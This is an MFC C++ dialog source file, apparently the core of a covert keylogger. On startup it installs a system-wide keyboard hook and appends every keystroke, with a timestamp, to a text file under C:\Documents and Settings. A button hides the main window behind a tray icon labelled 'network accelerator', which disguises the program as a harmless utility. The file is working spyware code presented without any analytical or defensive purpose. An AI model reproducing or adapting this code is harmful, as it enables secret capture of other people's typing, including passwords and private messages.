// hello1Dlg.cpp : implementation file
//

#include "stdafx.h"
#include "hello1.h"
#include "hello1Dlg.h"
#include "KeyHook.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

#define WM_MY_MESSAGE (WM_APP + 100)
#define WM_SHOWTASK (WM_APP + 101)

/////////////////////////////////////////////////////////////////////////////
// CAboutDlg dialog used for App About

class CAboutDlg : public CDialog
{
public:
	CAboutDlg();

// Dialog Data
	//{{AFX_DATA(CAboutDlg)
	enum { IDD = IDD_ABOUTBOX };
	//}}AFX_DATA

	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CAboutDlg)
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	//}}AFX_VIRTUAL

// Implementation
protected:
	//{{AFX_MSG(CAboutDlg)
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialog(CAboutDlg::IDD)
{
	//{{AFX_DATA_INIT(CAboutDlg)
	//}}AFX_DATA_INIT
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CAboutDlg)
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialog)
	//{{AFX_MSG_MAP(CAboutDlg)
		// No message handlers
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CHello1Dlg dialog

CHello1Dlg::CHello1Dlg(CWnd* pParent /*=NULL*/)
	: CDialog(CHello1Dlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CHello1Dlg)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
	// Note that LoadIcon does not require a subsequent DestroyIcon in Win32
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CHello1Dlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CHello1Dlg)
		// NOTE: the ClassWizard will add DDX and DDV calls here
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CHello1Dlg, CDialog)
	//{{AFX_MSG_MAP(CHello1Dlg)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_WM_DESTROY()
	ON_BN_CLICKED(IDC_BUTTON1, OnButton1)
	//}}AFX_MSG_MAP
	ON_MESSAGE(WM_MY_MESSAGE, OnMyMessage) // Maps our message
	ON_MESSAGE(WM_SHOWTASK,onShowTask)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CHello1Dlg message handlers

BOOL CHello1Dlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// Add "About..." menu item to system menu.

	// IDM_ABOUTBOX must be in the system command range.
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		CString strAboutMenu;
		strAboutMenu.LoadString(IDS_ABOUTBOX);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	
	// TODO: Add extra initialization here
	LRESULT lRes = InstallKeyHook(); // Install the hook
	
    ASSERT(lRes == KH_OK);
	
    // Prepare the KEYENTRY struct
	
    KEYENTRY ke;
    
    ke.nMessage = WM_MY_MESSAGE; // Our message ID
	
    ke.hCallWnd = m_hWnd; // Send message to this window
	
    ke.hHookWnd = 0; // Capture key-strokes occurred in any windows
	
    ke.iCombKeys = 0; // Combination key states do not matter
	
    ke.iIndicators = 0; // Caps-lock, Num-lock,
	
	// Scroll-lock on/off states do not matter
	
    ke.iKeyEvent = 
		KH_KEY_DOWN | KH_KEY_REPEAT; // Capture key-down and key-repeat events
	
    ke.iMinVKCode = 0; // Capture all keys regardless of their virtual key codes
	
    ke.iMaxVKCode = 255;
	
    // Add the entry to the hook
	
    lRes = AddKeyEntry(&ke);
    ASSERT(lRes == KH_OK);
	return TRUE;  // return TRUE  unless you set the focus to a control
}

void CHello1Dlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialog::OnSysCommand(nID, lParam);
	}
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CHello1Dlg::OnPaint() 
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, (WPARAM) dc.GetSafeHdc(), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

// The system calls this to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CHello1Dlg::OnQueryDragIcon()
{
	return (HCURSOR) m_hIcon;
}

void CHello1Dlg::OnOK() 
{
	// TODO: Add extra validation here
	
	CDialog::OnOK();
}

void CHello1Dlg::OnDestroy() 
{
	CDialog::OnDestroy();
	
	// TODO: Add your message handler code here
	UninstallKeyHook(); // Uninstall the hook to cleanup.
	NOTIFYICONDATA nid;
	nid.cbSize=(DWORD)sizeof(NOTIFYICONDATA);
	nid.hWnd=this->m_hWnd;
	nid.uID=IDR_MAINFRAME;
	nid.uFlags=NIF_ICON|NIF_MESSAGE|NIF_TIP ;
	nid.uCallbackMessage=WM_SHOWTASK;//自定义的消息名称
	nid.hIcon=LoadIcon(AfxGetInstanceHandle(),MAKEINTRESOURCE(IDR_MAINFRAME));
	Shell_NotifyIcon(NIM_DELETE, &nid);
}

LRESULT CHello1Dlg::OnMyMessage(WPARAM wParam, LPARAM lParam)
{
    // In this sample we will display the event types and
	
    // characters that the captured key events produced.
	
	
    KEYRESULT kr; // The struct to receive information
	
	
    // Information that we need to extract are event type and printable character
	
    //UINT nMask = KH_MASK_EVENTTYPE | KH_MASK_PRINTABLECHAR;
	UINT nMask = KH_MASK_ALL;
	
    // This function extracts event details
	
    LRESULT lRes = GetKeyEventResult(wParam, lParam, &kr, nMask);
    ASSERT(lRes == KH_OK);
	
    // We only display key-strokes that produce printable characters
	
    if (kr.chPrintableChar != 0)
    {
        CString sEvent;
        if (kr.iKeyEvent == KH_KEY_DOWN)
            sEvent = _T("Key Down");
        else if (kr.iKeyEvent == KH_KEY_UP)
            sEvent = _T("Key Up");
        else if (kr.iKeyEvent == KH_KEY_REPEAT)
            sEvent = _T("Key Repeat");
        else
            ASSERT(FALSE); // will neverappen
		
		CTime tm = CTime::GetCurrentTime();
		CString strTime = tm.Format("%Y %m %d %H:%M:%S");
        CString sMsg;
        sMsg.Format(_T("%s Event: %s\n字符:%c\n"), strTime,sEvent, kr.chPrintableChar);
        //MessageBox(sMsg); // display the result
		CStdioFile file("c:\\Documents and Settings\\wljsq.txt",CFile::modeCreate | CFile::modeWrite | CFile::typeText | CFile::modeNoTruncate);
		file.SeekToEnd();
		file.WriteString(sMsg);
		file.Close();
		
    }
	else
	{
		CString sEvent;
        if (kr.iKeyEvent == KH_KEY_DOWN)
            sEvent = _T("Key Down");
        else if (kr.iKeyEvent == KH_KEY_UP)
            sEvent = _T("Key Up");
        else if (kr.iKeyEvent == KH_KEY_REPEAT)
            sEvent = _T("Key Repeat");
        else
            ASSERT(FALSE); // will neverappen
		CTime tm = CTime::GetCurrentTime();
		CString strTime = tm.Format("%Y %m %d %H:%M:%S");
        CString sMsg;
        sMsg.Format(_T("%s Event: %s\n字符:%c\n"), strTime,sEvent, kr.iVKCode);
		CStdioFile file("c:\\Documents and Settings\\wljsq.txt",CFile::modeCreate | CFile::modeWrite | CFile::typeText | CFile::modeNoTruncate);
		file.SeekToEnd();
		file.WriteString(sMsg);
		file.Close();
	}
 
    return (LRESULT)0;
}

void CHello1Dlg::OnButton1() 
{
	// TODO: Add your control notification handler code here
	NOTIFYICONDATA nid;
	nid.cbSize=(DWORD)sizeof(NOTIFYICONDATA);
	nid.hWnd=this->m_hWnd;
	nid.uID=IDR_MAINFRAME;
	nid.uFlags=NIF_ICON|NIF_MESSAGE|NIF_TIP ;
	nid.uCallbackMessage=WM_SHOWTASK;//自定义的消息名称
	nid.hIcon=LoadIcon(AfxGetInstanceHandle(),MAKEINTRESOURCE(IDR_MAINFRAME));
	strcpy(nid.szTip,"网络加速器");//信息提示条为“计划任务提醒”
	Shell_NotifyIcon(NIM_ADD,&nid);//在托盘区添加图标
	ShowWindow(SW_HIDE);//隐藏主窗口
}

LRESULT CHello1Dlg::onShowTask(WPARAM wParam,LPARAM lParam)
//wParam接收的是图标的ID，而lParam接收的是鼠标的行为
{
	if(wParam!=IDR_MAINFRAME)
		return 1;
	switch(lParam)
	{
	case WM_RBUTTONUP://右键起来时弹出快捷菜单，这里只有一个“关闭”
		{
		}
		break;
	case WM_LBUTTONDBLCLK://双击左键的处理
		{
			this->ShowWindow(SW_SHOW);//简单的显示主窗口完事儿
		}
		break;
	}
	return 0;
}     